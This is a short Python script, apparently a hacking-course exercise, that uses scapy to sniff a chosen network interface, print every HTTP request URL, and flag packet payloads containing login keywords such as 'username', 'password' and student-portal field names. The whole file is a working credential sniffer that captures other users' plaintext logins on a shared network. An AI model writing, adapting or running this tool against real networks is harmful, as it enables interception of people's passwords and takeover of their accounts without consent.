#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import optparse

def get_Args():
    parser = optparse.OptionParser()
    parser.add_option('-i','--interface',dest='Interface',help='[+] PLEASE SPECIFY A INTERFACE WHOSE DATA YOU WANT TO SNIFF')
    options,arguments = parser.parse_args()
    return options.Interface

def sniffer(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print('[+] HTTP REQ >>>>   '+ str(url))
        if packet.haslayer(scapy.Raw):
            load = packet[http.Raw].load
            filter_list = ['username','uname','password','pass','txtStuUser','txtStuPsw','login']
            for word in filter_list:
                if word in str(load) :
                    print('\n\n[+] POSSIBLE USERNAME  AND  PASSWORDS  >>>>>    '+str(load)+'\n\n')
                    break

sniffer(get_Args())
